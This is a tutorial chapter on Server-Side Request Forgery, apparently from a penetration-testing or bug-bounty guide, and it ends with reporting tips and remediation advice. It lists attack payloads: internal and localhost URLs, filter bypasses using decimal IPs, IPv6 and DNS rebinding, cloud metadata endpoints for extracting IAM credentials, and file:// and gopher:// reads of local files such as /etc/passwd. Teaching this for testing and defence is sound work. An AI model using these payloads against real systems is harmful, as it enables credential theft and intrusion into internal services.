# Chapter 24 – Server-Side Request Forgery (SSRF)

## Mental Model
SSRF happens when the server fetches a URL **controlled by the attacker**.

If the server performs:
- HTTP requests  
- Image fetches  
- Webhooks  
- PDF generation  
- URL “preview”  
- SSRF-prone cloud metadata calls  

Then attackers can make the server request **internal or external** resources.

---

# Types of SSRF

## 1. **Basic SSRF**
Attacker forces server to request arbitrary URLs.

Examples:
http://localhost:8080/admin

http://127.0.0.1/

http://internal-api/v1/users

**Goal:** Read internal endpoints.

---

## 2. **Blind SSRF**
You don’t see response, but server still requests the URL.

Detection:
- Use collaborator (Burp, Interactsh)
- DNS log endpoints:
http://<your-collaborator>.oastify.com/

---

## 3. **Semi-Blind SSRF**
You only see small effects:
- Time delays
- Error differences
- Partial metadata

---

## 4. **Cloud SSRF (Most Valuable)**
Every major cloud provider has a metadata service:

### AWS
http://169.254.169.254/latest/meta-data/
Goal: Extract IAM keys → full cloud takeover.

### GCP
http://metadata.google.internal/

### Azure
http://169.254.169.254/metadata/instance

Impact: catastrophic.

---

# Where SSRF Hides

- Profile image URL fetchers  
- Webhooks  
- “URL preview” features in chats  
- PDF generators that load external resources  
- Import-from-URL functionality  
- Server-side crawlers  
- Video/image transcoding services  
- Payment webhooks  
- API backend that proxies external URLs  
- SSO integrations  
- “Check if URL is valid” validators  
- Social media link previews  

Anywhere user-supplied URLs are fetched = SSRF target.

---

# High-Value Payloads

## 1. Internal ports scan
http://127.0.0.1:22

http://localhost:3306

Sometimes response time + error behavior reveals whether port is open.

---

## 2. Bypass URL Filters

### Using redirects:
http://myserver.com@127.0.0.1/
### Using IPv6:
http://[::1]/

shell
Copy code

### Using decimal IP:
http://2130706433/

shell
Copy code

### Using DNS rebinding:
http://attacker-controlled-domain.com

yaml
Copy code
Server resolves domain → result points to 127.0.0.1.

---

## 3. Read Local Files (via file-wrapper)
If server supports:
file:///etc/passwd
gopher://
ftp://
dict://

yaml
Copy code

Huge impact.

---

## 4. Trigger Internal API Actions
Examples:
- Reset admin password  
- Trigger internal microservice operations  
- Pull secret tokens  
- Hit Kubernetes API  
- Access Redis without password  

---

# Cloud Metadata Payloads

### AWS Example
http://169.254.169.254/latest/meta-data/iam/security-credentials/

shell
Copy code

### GCP Example
http://metadata.google.internal/computeMetadata/v1/instance

shell
Copy code

### Azure Example
http://169.254.169.254/metadata/instance?api-version=2021-02-01

yaml
Copy code

---

# How to Test SSRF

## 1. Try direct internal hosts
http://localhost/
http://127.0.0.1/
http://0/

shell
Copy code

## 2. Test DNS logging
Use Burp Collaborator / Interactsh:
http://<your-id>.oastify.com/

markdown
Copy code

## 3. Break filters
Try:
- Redirect chains  
- Encoded IPs  
- Protocol smuggling  
- URL obfuscation  

## 4. Use all protocols
file://
gopher://
ftp://
dict://

markdown
Copy code

## 5. Fuzz parameter names
Patterns:
- `url`
- `link`
- `path`
- `image_url`
- `feed`
- `callback`
- `webhook`
- `avatar`
- `target`
- `destination`
- `endpoint`

---

# Real-World Attack Examples (Generalized)

### 1. Cloud Account Takeover  
Attacker extracts AWS IAM credentials → full S3, EC2, Lambda takeover.

### 2. Internal Admin Panel Access  
Attacker hits:
http://localhost:8080/admin

makefile
Copy code
Server returns admin JSON → attacker obtains secrets.

### 3. Kubernetes Cluster Access  
SSRF → access Kubernetes API → deploy malicious container.

### 4. Port Scanning  
Identify open internal services (Redis, MySQL, Consul).

### 5. Arbitrary File Read  
Using:
file:///etc/passwd

yaml
Copy code

---

# High-Value Targets Checklist
- Metadata endpoints  
- Redis, Memcached  
- Internal admin panels  
- Debug APIs  
- Docker / Kubernetes APIs  
- Message queues  
- Cloud internal services  
- Authentication endpoints  

---

# Automation Ideas
- Build SSRF URL-encoding toolkit  
- Port scanner via SSRF (timing-based)  
- Metadata exfil bot  
- URL normalizer + filter bypass generator  
- Gopher payload builder (for Redis exploitation)  

---

# Reporting Tips
Include:
- Exact vulnerable parameter  
- Request + response  
- Proof of internal access  
- Proof of metadata access (mask secrets!)  
- Attack path  
- Cloud takeover severity if applicable  

---

# Remediation
- Strict allowlist of domains  
- Enforce URL scheme (`https://` only)  
- Block IP literal access  
- Block private network IP ranges  
- Disallow redirects  
- Require SSRF proxy with validation  
- Metadata service IMDSv2 (AWS)  
- Avoid fetching user-supplied URLs  

